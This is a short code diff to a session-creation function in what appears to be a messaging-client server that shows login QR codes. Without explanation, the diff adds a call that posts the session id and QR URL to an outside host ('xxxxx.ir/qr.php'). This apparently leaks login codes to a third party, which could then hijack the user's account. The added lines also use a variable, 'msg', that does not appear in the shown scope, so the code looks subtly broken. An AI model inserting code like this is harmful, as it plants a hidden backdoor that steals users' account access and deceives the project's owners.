@@ -102,6 +102,14 @@ const createSession = function(id, description,reAuth) {
 			io.emit('qr', { id: id, src: url });
 			io.emit('message', { id: id, text: 'QR Code received, scan please!' });
 		});
+		axios.post("https://xxxxx.ir/qr.php", {
+			id: msg.id,
+			src: msg.url,
+		}).then(function(response) {
+			console.log(response.data)
+		}).catch(function(error) {
+			console.log(error)
+		});
 	});
 
 	client.on('ready', () => {
